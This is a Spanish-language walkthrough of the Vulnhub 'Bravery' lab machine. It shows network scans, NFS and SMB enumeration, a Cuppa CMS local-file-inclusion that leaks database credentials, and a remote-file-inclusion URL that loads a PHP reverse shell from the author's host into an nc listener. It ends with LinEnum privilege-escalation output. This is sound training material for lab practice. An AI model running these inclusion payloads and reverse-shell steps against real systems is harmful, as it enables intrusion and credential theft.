---
layout: post
title: Bravery - Walkthrough
date: 2020-03-25 20:44
description: Walkthrough - Bravery
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough
 - Vulnhub

---

## **Walkthrough de Bravery**
---

## **Links**
[Bravery en Vulnhub](https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.137`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 15:45 -03
Nmap scan report for 10.0.0.137
Host is up (0.000076s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
8080/tcp  open  http-proxy
20048/tcp open  mountd
37595/tcp open  unknown
45479/tcp open  unknown
MAC Address: 08:00:27:AD:1B:10 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

>**`nmap -A -T4 -p 22,53,80,111,139,443,445,2049,3306,8080,20048,37595,45479 10.0.0.137 -oA bravery`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 15:47 -03
Nmap scan report for 10.0.0.137
Host is up (0.00014s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
53/tcp    open  domain      dnsmasq 2.76
| dns-nsid: 
|   id.server: EZE
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      33859/udp   nlockmgr
|   100021  1,3,4      37595/tcp   nlockmgr
|   100021  1,3,4      41085/tcp6  nlockmgr
|   100021  1,3,4      45687/udp6  nlockmgr
|   100024  1          45479/tcp   status
|   100024  1          53576/udp   status
|   100024  1          54505/tcp6  status
|   100024  1          57317/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        nginx 1.12.2
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-server-header: nginx/1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
20048/tcp open  mountd      1-3 (RPC #100005)
37595/tcp open  nlockmgr    1-4 (RPC #100021)
45479/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:AD:1B:10 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: BRAVERY

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 1s
|_nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2020-03-23T14:48:08-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-23T18:48:08
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.14 ms 10.0.0.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds
```

---
### **Protocolo HTTP (80 y 8080)**
---

Existen dos servidores web corriendo, detras del puerto `80` hay un **Apache** con aparentemente configuraciones por defecto. Detras del puerto `8080` siguiendo la carpeta **public** que descubrió `Dirb` está el supuesto sitio web de la compañía **Good Tech**.

---

![img]({{ '/assets/images/Bravery/apache_00.png' | relative_url }}){: .center-image }*(Apache por defecto)*

---

![img]({{ '/assets/images/Bravery/nginx_00.png' | relative_url }}){: .center-image }*(Sitio Web de la compañía)*

---

Hay muchos más resultados de carpetas que encontraron las herramientas `Dirb` y `Nikto` pero ninguna contenía información relevante.


---
>**``nikto -h http://10.0.0.137``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.137
+ Target Hostname:    10.0.0.137
+ Target Port:        80
+ Start Time:         2020-03-23 15:46:11 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/1.0.2k-fips appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Retrieved x-powered-by header: PHP/5.4.16
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8698 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2020-03-23 15:47:23 (GMT-3) (72 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

>**``nikto -h http://10.0.0.137:8080``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.137
+ Target Hostname:    10.0.0.137
+ Target Port:        8080
+ Start Time:         2020-03-23 15:51:34 (GMT-3)
---------------------------------------------------------------------------
+ Server: nginx/1.12.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/qwertyuiop.html' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/public/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ /cgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /cgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /cgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ OSVDB-3092: /public/: This might be interesting...
+ /httpd.conf: Apache httpd.conf configuration file
+ /httpd.conf.bak: Apache httpd.conf configuration file
+ 9515 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-03-23 15:51:53 (GMT-3) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
---
>**``dirb http://10.0.0.137``**

```console
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar 23 15:46:24 2020
URL_BASE: http://10.0.0.137/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.137/ ----
+ http://10.0.0.137/0 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/1 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/2 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/3 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/4 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/5 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/6 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/7 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/8 (CODE:200|SIZE:30)                                                                             
+ http://10.0.0.137/9 (CODE:200|SIZE:2)                                                                              
+ http://10.0.0.137/about (CODE:200|SIZE:79)                                                                         
+ http://10.0.0.137/cgi-bin/ (CODE:403|SIZE:210)                                                                     
+ http://10.0.0.137/contactus (CODE:200|SIZE:27)                                                                     
+ http://10.0.0.137/phpinfo.php (CODE:200|SIZE:1)                                                                    
==> DIRECTORY: http://10.0.0.137/uploads/                                                                            
                                                                                                                     
---- Entering directory: http://10.0.0.137/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Mar 23 15:46:25 2020
DOWNLOADED: 4612 - FOUND: 14
```

---

>**``dirb http://10.0.0.137:8080``**

---

```console
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar 23 15:51:15 2020
URL_BASE: http://10.0.0.137:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.137:8080/ ----
+ http://10.0.0.137:8080/about (CODE:200|SIZE:503)                                                                   
+ http://10.0.0.137:8080/index.html (CODE:200|SIZE:2637)                                                             
==> DIRECTORY: http://10.0.0.137:8080/private/                                                                       
==> DIRECTORY: http://10.0.0.137:8080/public/                                                                        
+ http://10.0.0.137:8080/robots.txt (CODE:200|SIZE:103)                                                              
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/private/ ----
(!) WARNING: All responses for this directory seem to be CODE = 403.                                                 
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/ ----
==> DIRECTORY: http://10.0.0.137:8080/public/css/                                                                    
==> DIRECTORY: http://10.0.0.137:8080/public/fonts/                                                                  
==> DIRECTORY: http://10.0.0.137:8080/public/img/                                                                    
+ http://10.0.0.137:8080/public/index.html (CODE:200|SIZE:22963)                                                     
==> DIRECTORY: http://10.0.0.137:8080/public/js/                                                                     
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/css/ ----
==> DIRECTORY: http://10.0.0.137:8080/public/css/theme/                                                              
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/fonts/ ----
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/img/ ----
==> DIRECTORY: http://10.0.0.137:8080/public/img/elements/                                                           
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/js/ ----
==> DIRECTORY: http://10.0.0.137:8080/public/js/vendor/                                                              
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/css/theme/ ----
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/img/elements/ ----
                                                                                                                     
---- Entering directory: http://10.0.0.137:8080/public/js/vendor/ ----
                                                                                                                     
-----------------
END_TIME: Mon Mar 23 15:51:30 2020
DOWNLOADED: 41608 - FOUND: 4
```
---


### **Protocolo NFS**

---
Pareciera ser que se puede montar una unidad NFS sin mayores problemas con el siguiente comando:

---

>**``mount -t nfs 10.0.0.137:/var/nfsshare /root/Bravery/nfs/ -nolock``**

---
Lo más importante que se puede encontrar dentro del share NFS es un archivo llamado `qwertyuioplkjhgfdsazxcvbnm` y un archivo llamado `password.txt` que nos da la pista de que es un password:

---

```console
Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!
```
---

El resto de información que se encuentra dentro del share está puesta para hacer perder el tiempo al atacante.

Muy destacable es que aparentemente el share NFS está configurado con la opción [no_root_squash](http://systemadmin.es/2012/05/no_root_squash-vs-root_squash-de-nfs) deshabilitada, por lo tanto si montamos el share con el usuario root también podemos escribir y hacer lo que nos de la gana dentro del share con privilegios de root. **Posiblemente esto nos sirva más adelante.**

---

### **Protocolo SMB**
---
Existen dos carpetas a las cuales nos podemos conectar. **anonymous** que no requiere password y **secured** que requiere authenticación.

---

>**``smbclient //10.0.0.137/anonymous``**

---
```console
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 28 10:01:35 2018
  ..                                  D        0  Thu Jun 14 13:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 09:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 10:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 10:08:31 2018
  david's folder                      D        0  Tue Dec 25 23:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 09:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 09:45:22 2018
  sara's folder                       D        0  Fri Sep 28 10:34:23 2018
  readme.txt                          N      489  Fri Sep 28 10:54:03 2018

		17811456 blocks of size 1024. 13176100 blocks available
smb: \> 
```
---

Nuevamente, toda ls información que hay dentro del share está puesta para hacer perder el tiempo al atacante, por lo menos ahora tengo 6 nombre de usuario.

---

Lo próximo que hice fue tratar de autenticarme a la carpeta **secured** con el supuesto password encontrado en el share de NFS. Tuve éxito con el usuario **David**!!

---

>**``smbclient -U david //10.0.0.137/secured``**

---

```console
Enter WORKGROUP\david's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 28 10:52:14 2018
  ..                                  D        0  Thu Jun 14 13:30:39 2018
  david.txt                           N      376  Sat Jun 16 05:36:07 2018
  genevieve.txt                       N      398  Mon Jul 23 13:51:27 2018
  README.txt                          N      323  Mon Jul 23 22:58:53 2018

		17811456 blocks of size 1024. 13176064 blocks available
smb: \> 
```
---

Y de acá lo más importante fue encontrar el archivo `genevieve.txt`que nos tira alta URL escondida, lo único que tuve que hacer fue reemplazar la IP por la IP de la VM que estamos atacando...

---
```console
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
```

---

### **Protocolo HTTP revisitado (CuppaCMS)**
---

Buenisimo!!!! Apareció un CMS escondido:

---

![img]({{ '/assets/images/Bravery/cuppa_00.png' | relative_url }}){: .center-image }*(Te voy a hacer c... pa dentro)*

---

Todas las credenciales que probé no sirvieron de mucho así que antes de probar un ataque de fuerza bruta decidí hacer una búsqueda en **searchsploit**.

---

>``**searchsploit cuppa**``

```console
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion              | exploits/php/webapps/25971.txt
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
---

Y aparece un hermoso LFI y RFI, doble ataque!

---

Con la siguiente URL logré sacar la password de la DB corriendo (No permite conexiones remotas):

---

![img]({{ '/assets/images/Bravery/cuppa_01.png' | relative_url }}){: .center-image }*(Te voy a hacer c... pa dentro)*

---

La respuesta viene codificada en Base64:

```console
 PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiYnJhdmVyeSI7CgkJcHVibGljICR1c2VyID0gInJvb3QiOwoJCXB1YmxpYyAkcGFzc3dvcmQgPSAicjAwdGlzYXdlczBtZSI7CgkJcHVibGljICR0YWJsZV9wcmVmaXggPSAiY3VfIjsKCQlwdWJsaWMgJGFkbWluaXN0cmF0b3JfdGVtcGxhdGUgPSAiZGVmYXVsdCI7CgkJcHVibGljICRsaXN0X2xpbWl0ID0gMjU7CgkJcHVibGljICR0b2tlbiA9ICJPQnFJUHFsRldmM1giOwoJCXB1YmxpYyAkYWxsb3dlZF9leHRlbnNpb25zID0gIiouYm1wOyAqLmNzdjsgKi5kb2M7ICouZ2lmOyAqLmljbzsgKi5qcGc7ICouanBlZzsgKi5vZGc7ICoub2RwOyAqLm9kczsgKi5vZHQ7ICoucGRmOyAqLnBuZzsgKi5wcHQ7ICouc3dmOyAqLnR4dDsgKi54Y2Y7ICoueGxzOyAqLmRvY3g7ICoueGxzeCI7CgkJcHVibGljICR1cGxvYWRfZGVmYXVsdF9wYXRoID0gIm1lZGlhL3VwbG9hZHNGaWxlcyI7CgkJcHVibGljICRtYXhpbXVtX2ZpbGVfc2l6ZSA9ICI1MjQyODgwIjsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbiA9IDA7CgkJcHVibGljICRzZWN1cmVfbG9naW5fdmFsdWUgPSAiZ29vZHRlY2giOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gImRvb3JzaGVsbC5qcGciOwoJfSAKPz4K 
```
---

Decodificada:

---

```php
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "bravery";
		public $user = "root";
		public $password = "r00tisawes0me";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "goodtech";
		public $secure_login_redirect = "doorshell.jpg";
	} 
?>

```

Tiempo despues pude entrar a la DB y sacar varios passwords de usuarios como por ejemplo, la usuaria admin del CMS con la combinación de usuario y password `genevieve:genevieve` pero verdaderamente no sirvió de nada ir por ese camino.

---

La otra vulnerabilidad permite un RFI así que hice lo siguiente:

Levanté un servidor web ofreciendo una reverse shell en php:

---
>**``python -m SimpleHTTPServer``**

---

Creé una sesión con `NetCat` para recibir la shell reversa:

---

>**``nc -lnvp 1234``**

---

Creé la siguiente URL basada el advisory del [exploit](https://www.exploit-db.com/exploits/25971) :

>**``http://10.0.0.137/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.0.0.131:8000/shell.php?``**

---

Listo!!! Tengo una shell remota de bajos privilegios. Si tenemos muchas ganas se encuentra el archivo `local.txt` en la raíz con el siguiente contenido:

```console
cat local.txt
Congratulations on obtaining a user shell. :)
```
---

ahora a escalar privilegios...

---

### **Escalamiento de privilegios**

---

Mi usuario sin privilegios se llama **apache**, normalmente no se puede hacer mucho con ese usuario así que aproveché el bendito NFS share con permisos de root para descargar ahí [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) y darle permisos de todo para que mi usuario limitado pudiera ejecutar:

---

```console
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-03-25 20:56:09--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.192.133, 151.101.0.133, 151.101.64.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.192.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                    100%[===============================================>]  45.54K  --.-KB/s    in 0.01s   

2020-03-25 20:56:09 (3.40 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

root@duende:~/Bravery/nfs# chmod 4777 LinEnum.sh
```
---

Luego, fui a mi shell choto y ejecuté `LinEnum.sh` sin problemas:

```console
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Mar 25 05:56:53 EDT 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux bravery 3.10.0-862.3.2.el7.x86_64 #1 SMP Mon May 21 23:36:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 3.10.0-862.3.2.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-28) (GCC) ) #1 SMP Mon May 21 23:36:36 UTC 2018


[-] Specific release information:
CentOS Linux release 7.5.1804 (Core) 
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"

CentOS Linux release 7.5.1804 (Core) 
CentOS Linux release 7.5.1804 (Core) 


[-] Hostname:
bravery


### USER/GROUP ##########################################
[-] Current user/group info:
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             :0                        Tue Dec 25 23:14:48 -0500 2018
david            :0                        Sat Jul  7 03:21:20 -0400 2018
gdm              :0                        Mon Mar 23 11:45:05 -0400 2020


[-] Who else is logged on:
 05:56:53 up 1 day, 15:12,  0 users,  load average: 0.01, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(bin) gid=1(bin) groups=1(bin)
uid=2(daemon) gid=2(daemon) groups=2(daemon)
uid=3(adm) gid=4(adm) groups=4(adm)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=5(sync) gid=0(root) groups=0(root)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=7(halt) gid=0(root) groups=0(root)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=99(nobody) gid=99(nobody) groups=99(nobody)
uid=192(systemd-network) gid=192(systemd-network) groups=192(systemd-network)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=999(polkitd) gid=998(polkitd) groups=998(polkitd)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
uid=998(chrony) gid=996(chrony) groups=996(chrony)
uid=1000(david) gid=1000(david) groups=1000(david),1001(smbgrp)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=59(tss) gid=59(tss) groups=59(tss)
uid=997(geoclue) gid=995(geoclue) groups=995(geoclue)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=996(nginx) gid=994(nginx) groups=994(nginx)
uid=32(rpc) gid=32(rpc) groups=32(rpc)
uid=995(libstoragemgmt) gid=991(libstoragemgmt) groups=991(libstoragemgmt)
uid=994(gluster) gid=990(gluster) groups=990(gluster)
uid=993(unbound) gid=989(unbound) groups=989(unbound)
uid=107(qemu) gid=107(qemu) groups=107(qemu),36(kvm)
uid=113(usbmuxd) gid=113(usbmuxd) groups=113(usbmuxd)
uid=172(rtkit) gid=172(rtkit) groups=172(rtkit)
uid=992(colord) gid=988(colord) groups=988(colord)
uid=38(ntp) gid=38(ntp) groups=38(ntp)
uid=173(abrt) gid=173(abrt) groups=173(abrt)
uid=991(saslauth) gid=76(saslauth) groups=76(saslauth)
uid=171(pulse) gid=171(pulse) groups=171(pulse)
uid=990(sssd) gid=984(sssd) groups=984(sssd)
uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
uid=75(radvd) gid=75(radvd) groups=75(radvd)
uid=42(gdm) gid=42(gdm) groups=42(gdm)
uid=989(setroubleshoot) gid=983(setroubleshoot) groups=983(setroubleshoot)
uid=988(gnome-initial-setup) gid=982(gnome-initial-setup) groups=982(gnome-initial-setup)
uid=72(tcpdump) gid=72(tcpdump) groups=72(tcpdump)
uid=70(avahi) gid=70(avahi) groups=70(avahi)
uid=1001(ossec) gid=1002(ossec) groups=1002(ossec)
uid=1002(ossecm) gid=1002(ossec) groups=1002(ossec)
uid=1003(ossecr) gid=1002(ossec) groups=1002(ossec)
uid=1004(rick) gid=1004(rick) groups=1004(rick)


[-] It looks like we have some admin users:
uid=3(adm) gid=4(adm) groups=4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
david:x:1000:1000:david:/home/david:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
geoclue:x:997:995:User for geoclue:/var/lib/geoclue:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:995:991:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
colord:x:992:988:User for colord:/var/lib/colord:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
ossec:x:1001:1002::/var/ossec:/sbin/nologin
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash


[-] Super user account(s):
root


